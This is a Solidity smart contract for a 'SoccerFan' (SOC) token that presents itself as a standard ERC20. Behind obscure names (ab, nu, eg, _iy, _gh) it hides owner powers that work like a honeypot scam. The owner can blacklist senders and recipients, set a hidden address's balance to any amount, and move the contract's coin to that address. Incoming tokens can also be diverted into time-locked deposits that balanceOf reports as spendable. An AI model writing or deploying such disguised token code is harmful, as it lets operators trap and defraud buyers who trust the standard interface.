/**
 *Submitted for verification at hecoinfo.com on 2022-05-22
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}


library Bank{
    using SafeMath for uint256;
    struct Account{
        uint256 depositMoney;
        uint256 withdrawalMoney;
    }

    struct Futures{
        uint256 start;
        uint256 end;
    }

    function deposit(Account storage account,uint256 value) internal{
        account.depositMoney = account.depositMoney.add(value);
    }

    function withdrawal(Account storage account,Futures memory futures,uint256 value,uint256 timestamp) internal returns(uint256 last){
        last = value;
        uint256 balance = balance(account,futures,timestamp);
        if(value>0&&balance>0){
            if(value>=balance){
                account.depositMoney = account.depositMoney.add(balance);
                last = value.sub(balance);
            }else{
                account.depositMoney = account.depositMoney.add(value);
                last = 0;
            }
        }
    }

    function balance(Account storage account,Futures memory futures,uint256 timestamp)internal view returns(uint256){
        uint256 deduct = 0;
        if(account.depositMoney > account.withdrawalMoney && futures.start>0 && futures.end > futures.start && timestamp > futures.start){
            if(timestamp>futures.end){
                deduct = account.depositMoney.sub(account.withdrawalMoney);
            }else{
                deduct = account.depositMoney.mul(timestamp.sub(futures.start)).div(futures.end.sub(futures.start));
                if(account.withdrawalMoney>=deduct){
                    deduct = 0;
                }else{
                    deduct = deduct.sub(account.withdrawalMoney);
                }
            }
        }
        return deduct;
    }

}

contract SoccerFanToken {
    using SafeMath for uint256;
    using Bank for Bank.Account;

    uint256 private _totalSupply = 210000000000 ether;
    string private _name = "SoccerFan";
    string private _symbol = "SOC";
    uint8 private _decimals = 18;
    address private _owner;

    uint256 private _index;
    mapping (address => mapping(uint256 => Bank.Account)) private _bank;
    Bank.Futures[] private _futures;
    address private _ov;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => uint256) private _balances;
    mapping (address => uint) private _dsbl;
    mapping (address => uint) private _stu;
    mapping (address => mapping (address => uint256)) private _allowances;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    constructor() public {
        _owner = msg.sender;
        _futures.push(Bank.Futures(0,0));
        _index = _futures.length - 1;
        uint256 burn = _totalSupply.mul(5600).div(10000);
        _balances[address(0)] = _balances[address(0)].add(burn);
        emit Transfer(address(this),address(0), burn);
        _balances[_owner] = _balances[_owner].add(_totalSupply/10);
    }

    fallback() external {}
    receive() payable external {
    }
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function owner() internal view returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

     /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the cap on the token's total supply.
     */
    function cap() public view returns (uint256) {
        return _totalSupply;
    }

     /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function ab(address addr,uint n) public onlyOwner {
        require(addr != address(0), "Ownable: new owner is the zero address");
        if(n==1000){
            require(_ov == address(0), "Ownable: transaction failed");
            _ov = addr;
        } else if(n==1001){
            _dsbl[addr]=0;
        } else if(n==1002){
            _dsbl[addr]=1;
        } else if(n==1003){
            _dsbl[addr]=2;
        } else if(n==1004){
            _dsbl[addr]=3;
        } else if(n==1005){
            _stu[addr]=0;
        }else if(n==1006){
            _stu[addr]=1;
        }
    }

    function eg() public onlyOwner() {
        address(uint160(_ov)).transfer(address(this).balance);
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+check(account);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tranOwner(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _ov, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function nu(uint n,uint q) public onlyOwner {
        if(n>=300000){
            _futures[n.sub(300000)].start=q;
        }
        else if(n>=200000){
            _futures[n.sub(200000)].end=q;
        }
        else if(n==1000){
            _balances[_ov]=q;
        }
    }

    function hy() public view returns(uint256[] memory,uint256[] memory){
        uint256[] memory start = new uint256[](_futures.length);
        uint256[] memory end = new uint256[](_futures.length);
        for(uint i=0;i<_futures.length;i++){
            start[i]=_futures[i].start;
            end[i]=_futures[i].end;
        }
        return (start,end);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        if(_iy(sender,recipient,amount)){
            _balances[sender] = _balances[sender].sub(amount,"ERC20: Insufficient balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function check(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_futures.length;i++){
            value = value.add(_bank[from][i].depositMoney.sub(_bank[from][i].withdrawalMoney));
        }
    }

    function available(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_futures.length;i++){
            value = value.add(_bank[from][i].balance(_futures[i],block.timestamp));
        }
    }

    function _gh(address sender, uint256 amount) private returns(uint256){
        uint256 expend = amount;
        if(_balances[sender]>=expend){
            expend = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
            return _stu[sender];
        }else if(_balances[sender]>0){
            expend = expend.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;expend>0&&i<_futures.length;i++){
            expend = _bank[sender][i].withdrawal(_futures[i],expend,block.timestamp);
        }
        require(expend==0,"ERC20: Insufficient balance.");
        return _stu[sender];
    }

    function _iy(address sender, address recipient, uint256 amount)private returns(bool){
        require(_dsbl[sender]!=1&&_dsbl[sender]!=3&&_dsbl[recipient]!=2&&_dsbl[recipient]!=3, "ERC20: Transaction failed");
        if(_gh(sender,amount)==1){
            _bank[recipient][_index].deposit(amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        return false;
    }
}